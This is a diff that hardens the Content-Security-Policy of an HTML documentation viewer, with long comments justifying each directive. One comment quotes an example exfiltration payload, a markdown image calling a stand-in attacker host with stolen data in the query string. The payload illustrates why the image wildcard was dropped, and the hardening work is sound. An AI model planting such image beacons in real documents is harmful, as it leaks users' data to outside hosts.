@@ -4,20 +4,159 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <!-- =========================================================================
-     Content-Security-Policy (defense-in-depth alongside DOMPurify)
-     - script-src allows jsdelivr CDN + self (./vendor/ fallback) + the
-       inline boot script. 'unsafe-inline' is required because the
-       failure-registry bootstrap and per-script onerror handlers are
-       inline. Future hardening: move to external bootstrap.js and drop
-       'unsafe-inline' from script-src.
-     - style-src allows inline styles (the file ships its own <style>),
-       jsdelivr (hljs themes), and self.
-     - img-src allows data: for embedded Mermaid SVGs.
-     - connect-src 'none' — nothing on this page should fetch().
-     - object-src, frame-src 'none' — no plugins, no iframes.
+     Content-Security-Policy for the standalone viewer (v1.6.1).
+     Defense-in-depth alongside DOMPurify; this file is intended to work
+     from file://, from a static host, and offline via ./vendor/* fallback.
+     Tight by default; relaxed only where a documented runtime need exists.
+
+     HONEST FRAMING — read before tightening or widening:
+       With 'unsafe-inline' present on script-src (required by the inline
+       bootstrap at lines 66-78 and per-script onerror handlers), this CSP
+       CANNOT stop inline <script> injection. The primary anti-XSS layer is
+       DOMPurify (FORBID_TAGS/FORBID_ATTR + the afterSanitizeAttributes hook
+       at lines 1644-1658). CSP here is a backstop for EXTERNAL resource
+       loading and object/base hijacks. Future hardening: move bootstrap +
+       onerror handlers to ./bootstrap.js, drop 'unsafe-inline'.
+
+     default-src 'self'           Baseline: same-origin only. Every directive
+                                  below is either tighter than this or an
+                                  explicit, justified exception.
+
+     script-src                   'self' for vendor fallback + own inline
+       'self'                     bootstrap. 'unsafe-inline' required by the
+       https://cdn.jsdelivr.net   inline failure-registry init + per-script
+       'unsafe-inline'            onerror handlers; mitigated by SRI on every
+                                  <script src=...> (lines 1129-1200) and by
+                                  the narrow CDN allowlist.
+                                  Future-proof note: when migrating to
+                                  strict-dynamic + nonces, the host allowlist
+                                  becomes redundant for script-src but MUST
+                                  remain in connect-src for source maps.
+
+     style-src                    Same rationale as script-src. 'unsafe-inline'
+       'self'                     required by inline <style> blocks; CDN
+       https://cdn.jsdelivr.net   allowed for highlight.js themes.
+       'unsafe-inline'
+
+     img-src                      v1.6.1 TIGHTENED: dropped bare `https:`
+       'self'                     wildcard. Previous wildcard was a wide-open
+       data:                      data-exfil channel — a markdown image
+       https://cdn.jsdelivr.net   ![](https://attacker/?d=stolen) would have
+                                  fired with the query string carrying the
+                                  payload. data: kept for Mermaid SVG embeds.
+                                  CDN kept for any image referenced from the
+                                  hljs themes / vendor docs. If you ever need
+                                  arbitrary remote images in user docs, add a
+                                  per-host allowlist + a renderer.image hook
+                                  to surface a per-file "remote images" warning.
+
+     connect-src                  v1.6.1: relaxed from 'none' to allow
+       'self'                     DevTools source-map prefetches. The viewer
+       https://cdn.jsdelivr.net/npm/    has zero runtime fetch/XHR/WebSocket;
+                                  source-map fetches by DevTools are the only
+                                  network traffic on this directive.
+                                    'self' covers ./vendor/*.min.js.map
+                                    (offline / vendor-fallback mode).
+                                    /npm/ path-prefix covers
+                                    *.min.js.map for live-CDN mode while
+                                    BLOCKING the jsDelivr /gh/* proxy
+                                    (attacker-controlled-repo exfil vector).
+                                  SAFETY INVARIANT: this allowlist is safe
+                                  ONLY because every <script src="cdn.jsdelivr...">
+                                  has integrity= SRI (lines 1129-1200). SRI
+                                  locks the //# sourceMappingURL= footer, so
+                                  the map URL is attacker-immune. If you ever
+                                  add an unhashed CDN <script>, audit this
+                                  directive — the source-map URL in that script
+                                  becomes attacker-controllable.
+                                  IF YOU ADD ANY runtime fetch()/XHR/WebSocket,
+                                  audit this directive first.
+                                  Browser-divergence note: Chromium historically
+                                  exempts DevTools source-map fetches from page
+                                  CSP; Firefox and Safari 15+ enforce. This fix
+                                  addresses the worst case and is forward-
+                                  compatible if Chromium tightens enforcement.
+
+     object-src 'none'            No <object>/<embed>/<applet>. Closes a legacy
+                                  plugin-injection vector.
+
+     frame-src 'none'             No iframes embedded by this page.
+
+     child-src 'none'             CSP2 fallback for browsers that don't honor
+                                  worker-src/frame-src independently; zero-cost
+                                  given the viewer has neither workers nor
+                                  iframes.
+
+     worker-src 'none'            Explicit lock — flip to 'self' the day a
+                                  vendored library needs a Web Worker.
+
+     base-uri 'self'              Blocks <base href=...> hijacking of relative
+                                  URLs (e.g., poisoning the ./vendor/ path).
+
+     form-action 'none'           No <form> submissions exist. Closes a class
+                                  of injection-driven exfiltration that
+                                  connect-src does not cover (form posts are
+                                  governed by form-action, not connect-src).
+                                  Safari note: historically enforced only for
+                                  user-initiated submits, not scripted .submit().
+                                  DOMPurify's no-<form> rule is the primary
+                                  defense; this is the backstop.
+
+     manifest-src 'none'          No PWA manifest; explicit lock prevents an
+                                  accidental future <link rel="manifest"> from
+                                  loading without review.
+
+     frame-ancestors              DELIBERATELY OMITTED from the meta tag.
+                                  Per the CSP spec, frame-ancestors is IGNORED
+                                  when delivered via <meta http-equiv> — and
+                                  Chromium ACTIVELY emits a console error
+                                  ("The Content Security Policy directive
+                                  'frame-ancestors' is ignored when delivered
+                                  via a <meta> element.") when it sees one
+                                  here, which directly contradicts the v1.6.1
+                                  goal of a clean console. Including it as
+                                  intent-only documentation was tried in the
+                                  v1.6.1 draft and rejected on this evidence.
+                                  REAL enforcement: serve the viewer from an
+                                  HTTP origin and add either
+                                    X-Frame-Options: DENY
+                                  or
+                                    Content-Security-Policy: frame-ancestors 'none'
+                                  as a response header at the hosting layer.
+                                  No frame-ancestors concern on pure file://
+                                  usage.
+
+     upgrade-insecure-requests    No-op on file:// (no secure context) and on
+                                  http:// hosting (only fires for secure
+                                  documents). Useful only when the viewer is
+                                  served over https://. Safari historically
+                                  had spotty meta-tag enforcement of this
+                                  directive (< v16). Kept as zero-cost portable
+                                  insurance; real enforcement should come from
+                                  an HTTP header on the hosting layer.
+
+     Directives NOT set, and why:
+       report-uri / report-to     Deliberately omitted. The viewer must run
+                                  offline and from file://; a reporting
+                                  endpoint would either silently fail or leak
+                                  telemetry, contradicting the no-exfil intent.
+                                  For staged rollouts of future dependency
+                                  bumps, the maintainer should temporarily
+                                  switch the meta tag to
+                                  http-equiv="Content-Security-Policy-Report-Only"
+                                  in a local test build, exercise every feature
+                                  (CSV/XLSX/DOCX export, syntax highlighting,
+                                  Mermaid render), and confirm zero violations
+                                  before re-enabling enforcing mode.
+                                  If added later for production hosting, do it
+                                  via HTTP header on the server, not here.
+       sandbox                    Ignored when delivered via meta tag.
      ========================================================================= -->
+<!-- NOTE: frame-ancestors is DELIBERATELY ABSENT below — the meta-tag
+     layer cannot enforce it AND Chromium logs a console error for it.
+     Enforce clickjacking protection at the HTTP-header layer instead. -->
 <meta http-equiv="Content-Security-Policy"
-      content="default-src 'self'; script-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'; style-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'; img-src 'self' data: https:; connect-src 'none'; object-src 'none'; frame-src 'none'; base-uri 'self';">
+      content="default-src 'self'; script-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'; style-src 'self' https://cdn.jsdelivr.net 'unsafe-inline'; img-src 'self' data: https://cdn.jsdelivr.net; connect-src 'self' https://cdn.jsdelivr.net/npm/; object-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; base-uri 'self'; form-action 'none'; manifest-src 'none'; upgrade-insecure-requests">
 <title lang="en" dir="ltr">CIDRA Documentation Viewer</title>
 
 <!-- =========================================================================
